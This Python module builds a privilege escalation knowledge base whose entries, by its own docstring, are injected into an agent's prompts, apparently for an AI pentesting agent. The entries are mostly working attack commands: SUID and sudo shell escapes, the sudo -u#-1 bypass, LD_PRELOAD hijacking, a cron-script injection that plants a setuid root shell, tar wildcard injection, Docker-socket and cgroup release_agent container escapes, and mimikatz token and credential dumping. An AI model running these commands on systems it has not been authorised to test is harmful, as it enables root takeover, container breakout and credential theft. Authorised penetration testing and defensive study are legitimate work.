"""Privilege escalation knowledge base.

Deep knowledge about privilege escalation techniques:
1. Linux privilege escalation
2. Windows privilege escalation
3. Container escape
4. Kernel exploits
5. Misconfiguration-based escalation
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class PrivescPattern:
    """A privilege escalation pattern."""
    pattern_id: str = ""
    name: str = ""
    platform: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "platform": self.platform[:10],
        }


PRIVESC_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "priv-001", "name": "Linux SUID/SGID Exploitation",
        "platform": "linux", "severity": "critical",
        "desc": "Exploiting SUID/SGID binaries for root access.",
        "detection": (
            "LINUX SUID/SGID EXPLOITATION:\n"
            "FINDING SUID BINARIES:\n"
            "  find / -perm -4000 -type f 2>/dev/null\n"
            "  find / -perm -2000 -type f 2>/dev/null\n"
            "  find / -perm -u=s -type f 2>/dev/null\n"
            "COMMON EXPLOITABLE SUID BINARIES:\n"
            "  - nmap (interactive mode): nmap --interactive → !sh\n"
            "  - find: find . -exec /bin/sh \\;\n"
            "  - vim: vim -c ':!/bin/sh'\n"
            "  - python: python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'\n"
            "  - bash: bash -p\n"
            "  - cp: cp /bin/bash /tmp/bash; chmod +s /tmp/bash\n"
            "  - env: env /bin/sh -p\n"
            "  - awk: awk 'BEGIN {system(\"/bin/sh\")}'\n"
            "GTFOBins LOOKUP:\n"
            "  - https://gtfobins.github.io/ — comprehensive SUID exploit reference\n"
            "  - Check each found SUID binary against GTFOBins\n"
            "CUSTOM SUID:\n"
            "  - Look for custom applications with SUID bit\n"
            "  - Check for library hijacking (LD_PRELOAD, RPATH)\n"
            "  - Analyze binary with strings, ltrace, strace"
        ),
        "tools": ["linpeas", "linenum"],
    },
    {
        "id": "priv-002", "name": "Linux Sudo Misconfiguration",
        "platform": "linux", "severity": "critical",
        "desc": "Exploiting sudo misconfigurations.",
        "detection": (
            "LINUX SUDO EXPLOITATION:\n"
            "ENUMERATION:\n"
            "  sudo -l  # List sudo privileges\n"
            "  cat /etc/sudoers  # If readable\n"
            "COMMON EXPLOITABLE ENTRIES:\n"
            "  - (ALL) NOPASSWD: /usr/bin/vim → :!/bin/sh\n"
            "  - (ALL) NOPASSWD: /usr/bin/python → python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
            "  - (ALL) NOPASSWD: /usr/bin/less → !/bin/sh\n"
            "  - (ALL) NOPASSWD: /usr/bin/nmap → nmap --interactive → !sh\n"
            "  - (ALL) NOPASSWD: /usr/bin/find → find . -exec /bin/sh \\;\n"
            "  - (ALL) NOPASSWD: /usr/bin/awk → awk 'BEGIN {system(\"/bin/sh\")}'\n"
            "  - (ALL) NOPASSWD: /usr/bin/perl → perl -e 'exec \"/bin/sh\"'\n"
            "SUDO VERSION EXPLOITS:\n"
            "  - CVE-2019-14287: sudo -u#-1 /bin/bash (sudo < 1.8.28)\n"
            "  - CVE-2021-3156 (Baron Samedit): Heap buffer overflow (sudo 1.8.2-1.8.31p2)\n"
            "  - CVE-2023-22809: sudoedit bypass\n"
            "ENVIRONMENT VARIABLES:\n"
            "  - LD_PRELOAD: Create shared lib → sudo LD_PRELOAD=evil.so <cmd>\n"
            "  - PYTHONPATH: If sudo allows Python execution\n"
            "  - PATH: If sudo command uses relative paths"
        ),
        "tools": ["linpeas", "sudo_killer"],
    },
    {
        "id": "priv-003", "name": "Windows Token Manipulation",
        "platform": "windows", "severity": "critical",
        "desc": "Windows privilege escalation via token manipulation.",
        "detection": (
            "WINDOWS TOKEN MANIPULATION:\n"
            "PRIVILEGE CHECK:\n"
            "  whoami /priv  # List current privileges\n"
            "  whoami /all   # Full user info\n"
            "DANGEROUS PRIVILEGES:\n"
            "  SeImpersonatePrivilege:\n"
            "    - JuicyPotato/PrintSpoof/GodPotato\n"
            "    - Impersonate SYSTEM via COM server\n"
            "    - Common in IIS/MSSQL service accounts\n"
            "  SeDebugPrivilege:\n"
            "    - Inject into SYSTEM processes\n"
            "    - Dump LSASS for credentials\n"
            "  SeBackupPrivilege:\n"
            "    - Read any file (SAM, SYSTEM hives)\n"
            "    - reg save HKLM\\SAM sam.hiv\n"
            "  SeTakeOwnershipPrivilege:\n"
            "    - Take ownership of any object\n"
            "    - Modify DACLs for privilege escalation\n"
            "  SeLoadDriverPrivilege:\n"
            "    - Load vulnerable kernel driver\n"
            "    - Capcom.sys for kernel code execution\n"
            "TOKEN IMPERSONATION:\n"
            "  - Incognito: list_tokens -u → impersonate_token\n"
            "  - Mimikatz: token::elevate\n"
            "  - PowerShell: Invoke-TokenManipulation"
        ),
        "tools": ["winpeas", "juicypotato", "mimikatz"],
    },
    {
        "id": "priv-004", "name": "Linux Cron and Scheduled Tasks",
        "platform": "linux", "severity": "high",
        "desc": "Exploiting cron jobs and scheduled tasks.",
        "detection": (
            "CRON JOB EXPLOITATION:\n"
            "ENUMERATION:\n"
            "  crontab -l  # Current user's cron\n"
            "  cat /etc/crontab  # System cron\n"
            "  ls -la /etc/cron.*  # Cron directories\n"
            "  cat /var/spool/cron/crontabs/*  # All user crons\n"
            "  systemctl list-timers  # Systemd timers\n"
            "EXPLOITATION VECTORS:\n"
            "  1. Writable cron scripts:\n"
            "     - Find scripts executed by root cron\n"
            "     - If writable, inject payload\n"
            "     - echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> script.sh\n"
            "  2. PATH manipulation:\n"
            "     - Cron jobs with relative paths\n"
            "     - Create malicious binary in writable PATH dir\n"
            "  3. Wildcard injection:\n"
            "     - tar with * wildcard: create --checkpoint and --checkpoint-action files\n"
            "     - rsync with * wildcard: create -e sh script.sh file\n"
            "  4. Missing scripts:\n"
            "     - Cron references non-existent script\n"
            "     - Create script at expected path\n"
            "PSPY:\n"
            "  - Monitor processes without root: ./pspy64\n"
            "  - Detects hidden cron jobs and periodic tasks"
        ),
        "tools": ["pspy", "linpeas"],
    },
    {
        "id": "priv-005", "name": "Container Escape Techniques",
        "platform": "container", "severity": "critical",
        "desc": "Escaping container isolation to host.",
        "detection": (
            "CONTAINER ESCAPE:\n"
            "DETECTION (Am I in a container?):\n"
            "  cat /proc/1/cgroup | grep -i docker\n"
            "  ls -la /.dockerenv\n"
            "  cat /proc/self/mountinfo | grep -i overlay\n"
            "PRIVILEGED CONTAINER:\n"
            "  - Check: cat /proc/self/status | grep CapEff → 0000003fffffffff\n"
            "  - Mount host filesystem:\n"
            "    mount /dev/sda1 /mnt\n"
            "    chroot /mnt\n"
            "  - Access host devices: ls /dev\n"
            "DOCKER SOCKET:\n"
            "  - Check: ls -la /var/run/docker.sock\n"
            "  - If mounted: docker run -v /:/host --rm -it alpine chroot /host\n"
            "  - Create privileged container from inside\n"
            "KERNEL EXPLOITS:\n"
            "  - CVE-2022-0185: File system context exploit\n"
            "  - CVE-2022-0492: cgroups escape\n"
            "  - CVE-2021-22555: Netfilter exploit\n"
            "  - Dirty Pipe (CVE-2022-0847): Overwrite read-only files\n"
            "SYS_PTRACE:\n"
            "  - If CAP_SYS_PTRACE: attach to host process\n"
            "  - Inject shellcode into host PID namespace process\n"
            "RELEASE_AGENT:\n"
            "  - cgroups release_agent escape\n"
            "  - Write payload to cgroup release_agent\n"
            "  - Trigger notification to execute on host"
        ),
        "tools": ["deepce", "linpeas", "cdk"],
    },
]


class PrivescKB:
    """Privilege escalation knowledge base.

    Provides privesc techniques injected into
    agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, PrivescPattern] = {}
        self._log = logger.bind(component="privesc_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load privesc patterns."""
        for data in PRIVESC_PATTERNS:
            pattern = PrivescPattern(
                pattern_id=data["id"],
                name=data["name"],
                platform=data.get("platform", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_platform(self, platform: str) -> list[PrivescPattern]:
        """Get patterns by platform."""
        return [
            p for p in self._patterns.values()
            if p.platform.lower() == platform.lower()
        ]

    def build_privesc_prompt(
        self,
        platform: str = "",
        max_patterns: int = 4,
    ) -> str:
        """Build privilege escalation prompt."""
        lines = ["## Privilege Escalation Techniques\n"]
        count = 0
        for pattern in self._patterns.values():
            if platform and pattern.platform.lower() != platform.lower():
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.platform.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        plat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            plat_counts[p.platform] = plat_counts.get(p.platform, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_platform": plat_counts,
        }
